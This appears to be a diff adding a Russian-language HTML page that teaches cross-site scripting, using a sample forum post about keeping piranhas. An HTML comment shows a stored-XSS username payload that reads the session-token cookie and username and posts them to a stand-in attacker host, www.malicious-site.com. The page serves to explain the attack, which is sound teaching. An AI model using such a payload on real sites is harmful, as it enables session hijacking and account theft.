@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <title>Безопасность. XSS (Cross-site-scripting)</title>
+  </head>
+<body>
+  <h1>Здравствуйте, <span class="username">Обычный Пользователь</span>!</h1>
+  <article class="topic">
+    <header class="topic-header">
+      <h2>Разведение пираний в домашних условиях</h2>
+    </header>
+    <p class="topic-body">
+      Всем привет. Я решил завести себе пираний.
+  Расскажите, какие плюсы, минусы, подводные камни.</p>
+      <footer class="posted-by">
+          От <span class="poster-name">Другой Пользователь</span>
+      </footer>
+  </article>
+
+  <!-- Простая разметка — ничего необычного. Один из пользователей, который создал эту тему для обсуждения выбрал при регистрации необычное имя. Вот такое: -->
+
+<!-- Другой пользователь</span><script>const username=document.querySelector('.username').textContent;const sessionCookie=document.cookie.match(/session-token=([^;$]+)/)[1];fetch('http:/www.malicious-site.com',{method: 'post',body:JSON.stringify({username,sessionCookie})});</script> -->
+</body>
+</html>
